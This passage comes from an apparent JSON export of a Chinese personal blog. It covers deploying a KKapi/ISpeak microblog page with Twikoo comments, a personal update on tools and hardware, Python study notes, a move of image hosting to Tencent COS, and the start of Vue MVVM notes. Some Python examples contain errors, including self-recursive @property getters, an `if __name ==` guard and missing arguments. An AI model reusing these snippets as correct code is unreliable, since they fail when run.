123456，这个用户名密码用来登陆可视化的管理后台，并且用户似乎只能拥有一个。\nkkapiadmin（可视化管理后台） 参考官方文档中的教程，使用的 Vercel 部署的。这个墙不墙的就无所谓了，注意的坑有：\n修改部署分支和生产分支为 vercel。 fork 作者仓库的时候记得把 only fork master 取消勾选。 之后登录就是用前面初始化的用户名密码，进入后台以后可以修改密码。登陆后台以后需要设置：\nISpeak 标签。因为发布说说是需要选择标签的，标签中的背景颜色值是十六进制的颜色代码 添加用户token。需要注意！！！，添加的token的标题只能是 speak 不能是其他的，否则发布说说时会提示token不存在，发布时验证的就是字段为 speak 的token的值。 接下来可以在前端说说页面测试发布说说，发布说说需要输入后端 kkapi 地址、用户id （在管理后台可以找到）、token。网址：https://ispeak-biubiu.vercel.app/\n发布成功可以在后端看到发布的说说。\n前端部署 我使用的是 Ispeak 搭配的 twikoo 评论，因为现在博客使用的就是 twikoo，省去了再部署评论的麻烦。根据ISpeak文档部分，ispeak 配置项中 comment 是一个回调函数，可以自行初始化评论，参照twikoo评论初始化的格式。我博客中的说说页面代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;div id=\u0026#34;tip\u0026#34; style=\u0026#34;text-align:center;\u0026#34;\u0026gt;ipseak加载中\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;ispeak\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/highlight.js/10.6.0/styles/atom-one-dark.min.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/ispeak@4.4.0/style.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/highlight.js/10.6.0/highlight.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/marked/2.0.0/marked.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/ispeak@4.4.0/ispeak.umd.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twikoo/1.6.7/twikoo.all.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var head = document.getElementsByTagName(\u0026#39;head\u0026#39;)[0] var meta = document.createElement(\u0026#39;meta\u0026#39;) meta.name = \u0026#39;referrer\u0026#39; meta.content = \u0026#39;no-referrer\u0026#39; head.appendChild(meta) if (ispeak) { ispeak.init({ el: \u0026#39;#ispeak\u0026#39;, api: \u0026#39;这里是后端kkapi地址\u0026#39;, author: \u0026#39;后端用户id\u0026#39;, pageSize: 10, loading_img: \u0026#39;https://bu.dusays.com/2021/03/04/d2d5e983e2961.gif\u0026#39;, comment: function (speak) { const { _id, title, content } = speak // 4.4.0 之后在此回调函数中初始化评论 //这里是twikoo的初始化配置，如果使用其他评论可以在这里修改 twikoo.init({ el: \u0026#39;.ispeak-comment\u0026#39;, // 默认情况下 ipseak 生成class为 ispeak-comment 的div path: \u0026#39;/shuoshuo/?q=\u0026#39; + _id, envId: \u0026#34;twikoo后端地址\u0026#34; }) } }) .then(function () { console.log(\u0026#39;ispeak 加载完成\u0026#39;) document.getElementById(\u0026#39;tip\u0026#39;).style.display = \u0026#39;none\u0026#39; }) } else { document.getElementById(\u0026#39;tip\u0026#39;).innerHTML = \u0026#39;ipseak依赖加载失败！\u0026#39; } \u0026lt;/script\u0026gt; 更新一波。被人发现了说说的评论没有独立，自己改了下配置。 上面的代码加入了 32 和 37 行代码，其中 37 行 path 属性设置为你当前的说说页面路径加 q 参数，这个参数可能无所谓吧，但是 _id 是当前说说的唯一 id，因为自己在页面中测试时，说说评论请求的地址格式也是根据 37 行代码这个进行请求查询的。\nGithub 登陆验证（可选*） 可以发布仅登陆可见的说说，但是需要配置 Github app。\n参考项目文档创建 app ，其中填写的 speak 页面路径就是 ISpeak 所在的博客路径 创建以后拥有了 Client ID 和 Client Secrets，这两项需要填写在 kkapi 后端部署的 local.env 配置中。 在 kkapi 的后端界面个人设置中填写 GitHubId 。获得方法访问 github 提供的接口 https://api.github.com/users/\u0026lt;Your UserName\u0026gt;注意替换尖括号整体为你github的用户名，不是昵称。 在前端页面的 speak 初始化中添加两个属性 1 2 3 4 5 6 ispeak.init({ ... speakPage：\u0026#34;/shuoshuo/\u0026#34;, //这里是说说的页面路径，对应于 github app 中填写的 speak 页面路径（用双引号括起来，我不知道为啥单引号不行） githubClientId: \u0026#39;Iv1.*******\u0026#39;, //github app 的 Client ID ... }) 然后就可以在你的说说下面找到一个 Github 授权登陆。\n完工 说说还支持 markdown 格式的图片插入，看起来更好用了，给作者点个赞。\n","date":"2022-10-04T00:00:00Z","permalink":"https://www.braindance.top/articles/2022/10/kkapi-ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/","title":"KKapi+ISpeak说说页面部署"},{"content":"水一篇文章，写写最近干了啥\nOnenav 一直想找一个导航页的网站，自己天天用书签栏用的找不到太烦了。之前用过webstack主题的网站，本来是直接写源码上的，后来自己做了一个用js读配置文件加载的，但是加网站的时候要手改数据文件。 最后发现了正在用的导航页onenav\nOneNav是一款开源免费的书签（导航）管理程序，使用使用PHP + SQLite 3开发，界面简洁，安装简单，使用方便。OneNav可帮助你你将浏览器书签集中式管理，解决跨设备、跨平台、跨浏览器之间同步和访问困难问题，做到一处部署，随处访问。\n这个程序提供了后台管理的面板，添加网站的时候也能自己识别网站的title和description，还提供了好几个主题。下面是我网站的一部分，总之用起来还挺不错 踩的坑：官方文档里只提供了两个网站，但是在演示站找到了五六个，官方也提供了主题的下载和配置，但是需要订阅服务一年19.9，因为我是白嫖怪，就自己去找源码了\nbaisu\nbaisu-two\nWebstack\n找到源码需要改主题的资源地址，主题默认使用的onenav的旧变量TEMPLATE\n1 \u0026lt;script src=\u0026#34;templates/\u0026lt;?php echo TEMPLATE; ?\u0026gt;/js/jquery-3.5.1.min.js\u0026#34; type=\u0026#34;text/javascript\u0026#34; charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 最新版本已经不再使用配置文件中的TEMPLATE转而为$template存储，修改以后样式就正常加载了。\n域名 一直因为没有一个com的域名感到遗憾，最近看间谍过家家，记得阿尼亚和玩偶玩过家家的时候，有一只企鹅的名字就叫：[ペんぎんマン ]^(penginman)并且pingin的日语发音和企鹅penguin相似。于是有了这个域名 www.penginman.com\nmdserver-web mdserver-web\n简单的Linux面板,感谢BT.CN写出如此好的web管理软件。我一看到，就知道这是我一直想要的页面化管理方式。 复制了后台管理界面，按照自己想要的方式写了一版。\n一个把宝塔面板样式照搬过来的Linux管理面板，感觉现在也不是特别成熟，但是其他面板也没有太顺手的，为什么不用宝塔面板，因为之前报过关于网传信息泄露问题，我就是洁癖精。\n图床 之前用过一个Chevereto的图床，但是在国内服务器上部署，然后不想域名备案，所以访问老有问题。心血来潮在github上搜到了这两个项目\nLsky Pro\nPicX\nLsky Pro 这个主要发现支持对象存储，之前有篇文章说以后已经把网站的图片存到腾讯云COS了，所以用这个主要充当一个图床上传的工具，还加了一个本地存储策略随便存点东西。上传以后也是可以复制各种类型。 还可以在后台直接管理图片。具体的就看仓库的演示图吧。\nPicX 这个用来传一些不大重要的图片把，也算是能用，还是用github当图床的，只是jsdelivr国内经常挂，所以加了两个其他的CDN访问。\n显示器 开始觉得屏幕小了，也去换了个眼镜还是感觉不好使，上一个眼镜看东西已经有点白了，主要是打派找人太费劲了，而且已经研究生了，未来看文献也挺不错，打算奖励一个显示器爽爽。去网吧体验了一波27寸，又在网上恶补了一阵子知识，最后相中了AOC Q27G2S/D，趁着打折入了手，买东西的时候还发现京东太会了，我下了个单想看看哪个支付方式能再优惠点就取消，取消的时候选择了少用优惠券，弹出来的页面又领了50块大洋！！！😎😎😎又省一波。 到手送的一跟DP线，发现电脑没有口，只有一个HDMI和两个Mini DP，家里有一根HDMI的好像有问题，帧数高的时候就会花，又在网上买了一个Mini DP转DP，还是同一个快递员给我送的，快递员还认出来我了，怪不好意思的。\nMarkdown编辑器 最近发现Typora老版本不能用了，而且官方出了正式版需要付费，就找另外找了几个软件：\nNotion 这个软件感觉用来每个段落排版比较不错，但是windows端是个网页的套壳，而且国内正常好像还访问不了，用过一阵子换了 Obsidian 也挺不错的软件，可以在多个文章直接加上双向链接，还有脑图什么的，而且开源的插件社区，但是就是因为功能太多了感觉有点复杂 MarkText 很清爽的一个界面，但是目前还没支持中文。 Joplin 最后选择用的。界面清爽、管理笔记也挺不错，主要发现了有可以自己部署私有云笔记，下一步折腾这个。 软路由 先放一个骚话生成器项目里的模板\n快过年了，不要再讨论什么NAS、HTPC、OpenWrt之类的了。你带你的大机箱回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的破群晖。亲戚朋友吃饭问你收获了什么，你说我组了一个RAID 0的ALL IN ONE，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的刮削器，不懂你的Auto Backup，也笑他们看爱奇艺还要忍受会员专属广告。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子装了个黑盒子，开起来嗡嗡响、家里电表走得越来越快了。\n我感觉我要走前辈走过的路了，所以还有个念想就是整一个ALL IN ONE耍一耍，目前没有资金，看中了一个N5105的小主机标价888，等研究生发现工资了，整一个鼓捣鼓捣。\n","date":"2022-08-10T18:39:26+08:00","permalink":"https://www.braindance.top/articles/2022/08/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/","title":"近期总结"},{"content":"函数 函数的参数 可以使用可变参数def func(*args)，参数前面的*代表args是一个可变参数。\n用模块管理函数 每个文件代表一个模块，不同模块的函数命名可以相同，但是如果如下代码引用\n1 2 3 from module1 import foo from module2 import foo foo() 程序会调用最后一个调用的foo函数。 如果导入模块中除了定义的函数以外有可执行的代码，则Python解释器在导入这个模块时就会执行这些代码。可以利用只有被Python解释器直接执行的模块的名字才是 __main__ 进行判断\n1 2 3 4 5 6 7 def foo(): pass # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;call foo()\u0026#39;) foo() 在其他模块再导入上述模块时，if条件中的语句就不会执行\n变量作用域 Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索。内置作用域及python内置的标识符如：input、print、int。 可以使用global关键字来指示局部函数中的变量来自全局变量，nonlocal关键字表示变量来自外部嵌套函数内的变量\n事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。\n字符串和常用数据结构 字符串 反斜杠\\用来转义。 \\后面可以跟八进制和六进制来表示字符，\\u68d2使用unicode字符编码表示字符。 如果不想使用\\转义，可以在字符串前加上字母r说明\n1 2 s1 = r\u0026#39;\\n\\\\hello, world!\\\\\\n\u0026#39; print(s1) # \\n\\\\hello, world!\\\\\\n 使用+进行字符串拼接，使用*重复一个字符串的内容，in、not in来判断字符串中是否包含子串，[]、[:]用来切片运算。\n字符串类型是一种结构化的、非标量类型，所以会有一系列的属性和方法。 字符串对象身上的常用的函数：\nlen()；获取字符串长度 capitalize()；字符串首个字母大写的拷贝 title()；每个字符串单词首字母大写的拷贝 upper()；所有字符串大写的拷贝 find()；查找字串位置。未找到值为 -1 startswith()；以某字符开始。类似的有endswith() center(50,\u0026rsquo;*\u0026rsquo;)；将字符串以指定宽度居中，填充指定字符。类似的有rjust()、ljust() isdigit()；是否为数字构成 isalpha()；是否为字母构成 isalnum()；是否为数字字母构成 strip()；获取处理左右两侧空格后的拷贝 格式化输出字符串 使用%d、%s等占位符，并在字符串结尾使用%()列表对应。 字符串提供的format()方法。 Python 3.6以后提供了语法糖表示，在字符串前使用f。\n1 2 3 4 a,b = 5,10 print(\u0026#39;%d * %d = %d\u0026#39; % (a, b, a * b)) print(\u0026#39;{0} * {1} = {2}\u0026#39;.format(a, b, a * b)) print(f\u0026#39;{a} * {b} = {a * b}\u0026#39;) 列表 数值类型（int、float）是标量类型，列表（list）是一种结构化的、非标量类型。 可以使用下标的方式遍历列表元素，或者for循环遍历列表元素\n1 2 3 4 5 6 7 8 9 10 list = [1,2,3,4,5,6] //通过下标访问 for index in range(len(list)): print(list[index]) //遍历元素访问 for elem in list: print(elem) //使用enumerate()处理获得元素及其下标 for index, elem in enumerate(list1): print(index, elem) enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。\n列表也可以使用+进行拼接，使用切片操作获得列表的复制。 sorted()函数返回列表进行排序后的备份，不会影响原来的列表，我们设计函数应该像 sorted 函数一样不产生副作用。可以设置关键字reverse=True使列表逆置，关键字key=len根据字符串长度进行排序\n生成式和生成器 生成式表达式创建列表容器和生成器创建列表容器\n1 2 3 4 5 6 7 //用列表的生成表达式语法创建列表容器 //表达式生成的容器里面元素已经准备就绪，所以会耗费较多内存空间 f1 = [x ** 2 for x in range(1, 1000)] //下面的代码创建的不是一个列表而是一个生成器对象 //生成器会在使用时，经过运算获取数据，不占用额外空间，但是消耗时间 f2 = (x ** 2 for x in range(1, 1000)) 还可以使用关键字yield将一个普通函数改造成生成器函数，下面是使用生成器函数打印斐波那契数列的例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def fib(n): a, b = 0, 1 for _ in range(n): a, b = b, a + b yield a def main(): for val in fib(20): print(val) if __name__ == \u0026#39;__main__\u0026#39;: main() 元组 元组与列表类似也是一种容器数据类型，但是元素内的元素不可以被修改。 可以使用列表的方法访问元素，不能修改元组元素，但是可以引用新的元组，原来的元素就会被垃圾回收。 使用list()函数将元组转换成列表，使用tuple()函数将列表转换成元组。 为什么要用元组？\n元组可以在多线程环境中保证对象状态不会被修改，一个不变对象自动就是线程安全的，这样就可以省掉处理同步化的开销。 元组在创建时间和占用的空间上面都优于列表。 集合 集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。 如果定义集合时有重复元素会被剔除；集合可以添加删除元素； 集合的成员进行交集（\u0026amp;）、并集、差集等运算。例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 set1 = {1, 2, 3, 3, 3, 2} # 集合的交集、并集、差集、对称差运算 print(set1 \u0026amp; set2) # print(set1.intersection(set2)) print(set1 | set2) # print(set1.union(set2)) print(set1 - set2) # print(set1.difference(set2)) print(set1 ^ set2) # print(set1.symmetric_difference(set2)) # 判断子集和超集 print(set2 \u0026lt;= set1) # print(set2.issubset(set1)) print(set3 \u0026lt;= set1) # print(set3.issubset(set1)) print(set1 \u0026gt;= set2) # print(set1.issuperset(set2)) print(set1 \u0026gt;= set3) # print(set1.issuperset(set3)) 字典 字典可以存储任何数据类型，每一个元素都为一个键一个值的key:value格式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 dic1={\u0026#39;筑基丹\u0026#39;: 1100, \u0026#39;元灵精华\u0026#39;: 900, \u0026#39;磐龙宝剑\u0026#39;: 11000} # 创建字典的构造器语法 items1 = dict(one=1, two=2, three=3, four=4) # 通过zip函数将两个序列压成字典 items2 = dict(zip([\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;], \u0026#39;123\u0026#39;)) # 对字典中所有键值对进行遍历 for key in dic1: print(f\u0026#39;{key}: {dic1[key]}\u0026#39;) # get方法也是通过键获取对应的值但是可以设置默认值 print(scores.get(\u0026#39;神农鼎\u0026#39;, 60)) 面向对象编程 比较正式的说法\n\u0026ldquo;把一组数据结构和处理它们的方法组成对象（object），把相同行为的对象归纳为类（class），通过类的封装（encapsulation）隐藏内部细节，通过继承（inheritance）实现类的特化（specialization）和泛化（generalization），通过多态（polymorphism）实现基于对象类型的动态分派。\u0026rdquo;\npython中使用class关键字定义类，然后在类中定义属性和方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print(\u0026#39;%s正在学习%s.\u0026#39; % (self.name, course_name)) def main(): stu1 = Student(\u0026#39;大卫\u0026#39;,18) stu1.study() 在python中可以给对象的属性或方法添加访问权限，就像Java中的私有属性，可以在属性或方法前添加双下划线__表示改方法是私有的，并且调用对象的属性或方法时会报'XXX' object has no attribute '__xx'的错误。 但是Python并没有从语法上保护属性或方法的私密性，如果知道更换名字的规则仍然可以访问到它们，如\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Test: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print(\u0026#39;__bar\u0026#39;) def main(): test = Test(\u0026#39;hello\u0026#39;) test._Test__bar() print(test._Test__foo) if __name__ == \u0026#34;__main__\u0026#34;: main() 之所以这样设定，可以用这样一句名言加以解释，就是\u0026quot;We are all consenting adults here\u0026quot;。因为绝大多数程序员都认为开放比封闭要好，而且程序员要自己为自己的行为负责。实际开发过程中Python程序员会遵循一种命名习惯就是让属性以单下划线开头表示属性是受保护的，其他类访问这样的属性时应该慎重，这种做法并不是语法上的规则，而是一种隐喻。 作者踩过的坑《Python - 那些年我们踩过的那些坑》。\n面向对象的支柱 ：封装、继承、多态。\n封装的感觉有点像webapi\n面向对象进阶 @property装饰器 之前讲过的使用单下划线标识变量为私有的，不建议外界直接访问，如果想访问可以使用 @property装饰器 可以用来包装getter和setter方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Person(object): def __init__(self,name,age): self.name = name self.age = age @property def name(self): return self.name @property def age(self): return self.age @age.setter def age(self,age): self.age = age #没有定义name的setter方法，如果访问的话会报AttributeError: can\u0026#39;t set attribute错误 __ slots __魔法 由于Python是一种动态语言，允许在程序运行中给对象或属性绑定新的方法和属性，可以使用__slots__魔法来限定类可以绑定的属性和方法。\t__slots__是一个变量，英文名直接翻译过来的意思是插槽，可以理解为在其中的方法或属性规定为类可拥有的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Person(object): __slots__ = (\u0026#39;_name\u0026#39;, \u0026#39;_age\u0026#39;, \u0026#39;_gender\u0026#39;) def __init__(self,name,age): self.name = name self.age = age @property def name(self): return self.name @property def age(self): return self.age @age.setter def age(self,age): self.age = age #如果添加或设置不在__slots__包含的属性，如\u0026#39;_is_man\u0026#39;则会报错AttributeError: \u0026#39;Person\u0026#39; object has no attribute \u0026#39;_is_man\u0026#39; 静态方法和类方法 类中的方法不一定都是对象方法（给类对象传递消息），也有一些通用的静态方法，如：三角形类中还为创建对象之前需要判断三条边是否能组成三角形，判断边能否组成三角形就可以设置为静态方法。类方法个人理解类似于Java中的默认构造方法。 静态方法使用@staticmethod装饰器，举例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Triangle(object): def __init__(self, a, b, c): self._a = a self._b = b self._c = c @staticmethod def is_valid(a, b, c): return a + b \u0026gt; c and b + c \u0026gt; a and a + c \u0026gt; b def main(): #静态方法 a,b,c = 6,8,10 if Triangle.is_valid(a, b, c): print(\u0026#34;构成三角形\u0026#34;) if __name == \u0026#39;__main__\u0026#39;: main() 类方法使用@classmethod装饰器，类方法的第一个参数约定名为cls参数，它代表的是当前类相关的信息的对象，举例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 class Clock(object): \u0026#34;\u0026#34;\u0026#34;数字时钟\u0026#34;\u0026#34;\u0026#34; def __init__(self, hour=0, minute=0, second=0): self._hour = hour self._minute = minute self._second = second @classmethod def now(cls): ctime = localtime(time()) return cls(ctime.tm_hour, ctime.tm_min, ctime.tm_sec) def show(self): \u0026#34;\u0026#34;\u0026#34;显示时间\u0026#34;\u0026#34;\u0026#34; return \u0026#39;%02d:%02d:%02d\u0026#39; % \\ (self._hour, self._minute, self._second) def main(): clock = Clock.now() clock.show() if __name == \u0026#39;__main__\u0026#39;: main() 类之间的关系 类之间的关系主要有三种：is-a、has-a和use-a关系\nis-a关系。通常称为继承或者泛化，如学生和人的关系，狗和宠物的关系。 has-a关系。通常称为关联，如部门和公司、汽车和引擎的关系。 关联关系如果是整体和部分的关联，则称这种关联为聚合关系 如果整体负责了部分的生命周期（比如我和我的脑子）整体和部分是不可分割的，整体的生命周期结束就表示部分的生命周期结束，这种关联是最强的关联关系，称为强聚合或者组合关系 use-a关系。称为依赖关系，表示一个类依赖于顶一个类的定义，依赖关系总是单向的。比如某人要过河，需要借用一条船，此时人与船之间的关系就是依赖。 这些都属于UML（统一建模语言）用来描述对象之间的关系。参考内容：UML的四种关系。还可以去看《UML面向对象设计基础》一书\n继承和多态 我们可以在已有的类的基础之上建立新的类，可以直接将原有类中的属性和方法继承下来，从而减少重复代码。继承中有两个概念：\n父类。也成超类、基类，是提供类继承信息的类 子类。也成派生类、衍生类，是得到继承信息的类 子类除了可以继承父类中的属性和方法，还可以定义自己新的属性和方法，所以子类的功能也会更全面。在开发中也经常使用子类替换父类对象，这一规则称为里氏替换原则。 继承的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Person(object): def __init__(self, name, age): self._name = name self._age = age \u0026#34;\u0026#34;\u0026#34; 省略setter和getter方法 \u0026#34;\u0026#34;\u0026#34; class Student(Person): def __init__(self, name, age, grade):\tsuper().__init__(name, age)#调用父类的初始化方法 self._grade = grade 子类继承父类方法以后，可以对父类已经实现的方法重新构造，这种行为称为方法重写（override）。通过重写父类的方法，可以使得不同的子类拥有不同的行为，这就是所谓的多态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from abc import ABCMeta, abstractmethod class Pet(object, metaclass=ABCMeta): \u0026#34;\u0026#34;\u0026#34;宠物\u0026#34;\u0026#34;\u0026#34; def __init__(self, nickname): self._nickname = nickname @abstractmethod def make_voice(self): \u0026#34;\u0026#34;\u0026#34;发出声音\u0026#34;\u0026#34;\u0026#34; pass class Dog(Pet): def make_voice(self): print(\u0026#39;%s: 汪汪汪...\u0026#39; % self._nickname) class Cat(Pet): def make_voice(self): print(\u0026#39;%s: 喵...喵...\u0026#39; % self._nickname) 在上面代码中，创建了 Pet 抽象类，抽象类就是不能够被创建成对象的类，它是专门用来让其他类继承它。Python中没有Java那样对抽象类的支持，但是可以使用 abc 模块的 ABCMeta 元类和 abstractmethod 包装器来达到抽象类的效果。Dog 和 Cat 类分别继承了抽象类 Pet 并重写了 make_voice 方法，当分别创建两个对象并调用方法时，这个方法就表现出了多态行为。\n文件和异常 开发中经常需要将数据持久化存储，最简单的方式就是存到文件中，Python可以使用 open 函数，指定文件名、操作模式、编码信息等获取到操作文件的对象。具体的操作模式如下表\n操作模式 具体含义 'r' 读取 （默认） 'w' 写入（会先截断之前的内容） 'x' 写入，如果文件已经存在会产生异常 'a' 追加，将内容写入到已有文件的末尾 'b' 二进制模式 't' 文本模式（默认） '+' 更新（既可以读又可以写） 下图是来自菜鸟教程中的辅助图记。\n读写文本文件 读取文件时使用 r 操作模式即可，encoding 参数可以指定编码（若未指定，默认值是None，读取时会使用系统默认编码），如果编码不一致会无法解码导致读取失败。读取文件时会遇到各种错误如：文件找不到会引发 FileNotFoundError，指定了未知的编码会引发 LookupError，而如果读取文件时无法按指定方式解码会引发 UnicodeDecodeError，可以使用 try-except 代码块捕获异常\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def main(): f = None try: f = open(\u0026#39;致橡树.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) print(f.read()) except FileNotFoundError: print(\u0026#39;无法打开指定的文件!\u0026#39;) except LookupError: print(\u0026#39;指定了未知的编码!\u0026#39;) except UnicodeDecodeError: print(\u0026#39;读取文件时解码错误!\u0026#39;) finally: if f: f.close() if __name__ == \u0026#39;__main__\u0026#39;: main() try-except 代码块最后可以使用 finally 块执行外部资源的释放的操作，因为在它其中的代码，不论程序正常还是异常执行都会被执行，即使是 sys 的 exit 函数都会被执行，因为 exit 函数实质上是引发了 SystemExit 异常。 除了 finally 块来执行外部资源的释放以外，还可以使用 with 关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源。\n1 2 with open(\u0026#39;致橡树.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: print(f.read()) 除了使用 read 方法读取文件内容以外，还可以使用 for-in 循环逐行读取或是 readlines 将文件按行读取到一个列表容器中。\n1 2 3 4 5 6 7 8 9 10 with open(\u0026#39;致橡树.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: print(f.read()) ith open(\u0026#39;致橡树.txt\u0026#39;, mode=\u0026#39;r\u0026#39;) as f: for line in f: print(line, end=\u0026#39;\u0026#39;) with open(\u0026#39;致橡树.txt\u0026#39;) as f: lines = f.readlines() print(lines) 如果想要写入文件可以使用 w 操作模式，但是其会覆盖文件原来的内容，如果想要追加内容可以使用 a 操作模式\n读写二进制文件 二进制文件常见的有图片的复制或写入图片内容，需要使用二进制模式 b，可以接合读或写模式为 rb 、wb。\n读写JSON文件 一个JSON数据类型和Python数据类型的对照表\nJSON Python object dict array list string str number (int / real) int / float true / false True / False null None Python 中的 json 模块包含了对 JSON 格式字串操作的函数，分别是：\ndump - 将 Python 对象按照 JSON 格式序列化到文件中 dumps - 将 Python 对象序列化为 JSON 格式字串 load - 和 dump 相反。(将文件中的 JSON 数据反序列化为 Python 对象) loads -和 dumps相反。（将字符串的内容反序列化成Python对象） 1 2 3 4 5 6 7 8 9 10 11 mydict = { \u0026#34;tieba\u0026#34;:{ \u0026#34;type\u0026#34;: \u0026#34;image\u0026#34;, \u0026#34;container\u0026#34;: [ { \u0026#34;icon\u0026#34;: \u0026#34;\u0026lt; img src =\\\u0026#34;emoji/tieba/呵呵.png\\\u0026#34;\u0026gt;\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;呵呵\u0026#34; }, { \u0026#34;icon\u0026#34;: \u0026#34;\u0026lt; img src =\\\u0026#34;emoji/tieba/哈哈.png\\\u0026#34;\u0026gt;\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;哈哈\u0026#34; } ] } } with open(\u0026#39;data.json\u0026#39;, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as fs: json.dump(mydict, fs) 留个异常的坑以后来填。总结：Python中的异常处理\n","date":"2022-06-06T00:00:00Z","permalink":"https://www.braindance.top/articles/2022/06/python-day-100-%E7%AC%94%E8%AE%B0/","title":"Python-Day-100 笔记"},{"content":"起因 原来博客的图片使用Jsdelivr和github的方式存储访问，但是最近Jsdelivr频繁的被墙，感觉可能在未来的不久会失效，毕竟好多人用来当免费的CDN（比如我），也会有人使用其访问些zz敏感或其他的文件，被墙了也情有可原，而且github的仓库的作用也是用来存储代码而非图床，像我这样的人也导致了仓库的滥用，所以决定找个新的途径。\n过程 当时在网上找了好久，最后在loc上找到了 一个帖子，感觉把目前行得通的方法都列出来了。\n一、第三方存储\ngithub+jsdelivr 或 gitee 可以搭配PicGo使用 茎肛互撸娃大佬的鸡霸图床 国内对象存储 使用Onedrive 或 Google Drive 搭建图床 二、自行搭建\n（腾讯云轻量香港 or CDN） 反代 （本地 or 大盘鸡） 北岸域名+国内机器 国内机器非标准端口 家宽开通公网IP存在家里 三、直接嵌在文档中，图片转base64，markdown插入\n最后我是选择了良心云的cos对象存储，新用户第一年便宜，就算以后续费一年差不多也70左右。之前自己有了解过对象存储这一技术，但是当时听闻的是有人被套路云的流量计费给掏空了，这次在良心云的计费方式中找到了按量计费，这也刚好满足了博客图片也不多的需求，更不怕被人把钱包给刷爆了。\n上传的方式还是配合PicGo上传，又添加了一个rename-file插件实现上传路径的命名。因为感觉对象存储给的链接太长，国内没有备案的域名，使用了一个服务器直接域名重定向到对象存储给的域名。\n结果 宣布从这篇文章开始往后的图片都会用对象存储，之前的文章如果有需要评论或者联系我再补上吧。\n插曲（避坑） 期间使用对象存储测试图片的时候，发现过一阵子图片就访问不了了，去桶里一看发现空空如也，发生了两次清空也不知道啥原因，最后一次点了下清空存储桶，发现使用方式里有个生命周期管理，发现是这玩意自动删除文件，所以记得把生命周期规则修改一下。\n","date":"2022-05-01T00:00:00Z","permalink":"https://www.braindance.top/articles/2022/05/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/","title":"博客图床迁移"},{"content":"理解MVVM Vue参考的MVVM模型\nM：模型(Model) ：data中的数据 V：视图(View) ：模板代码 VM：视图模型(ViewModel)：Vue实例 观察发现：\ndata中所有的属性，最后都出现在了vm身上。 vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。 数据代理 回顾Object.defineProperty方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 let number = 18 object.defineProperty(person,\u0026#39;age\u0026#39;,{ value:18, enumerable:true，//控制属性是否可以枚举，默认值是false writable:true，//控制属性是否可以被修改，默认值是false configurable:true //控制属性是否可以被删除，默认值是false //当有人读取person的age属性时，get函数（getter)就会被调用，且返回值就是age的值 get(){ return number }, //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value){ number = 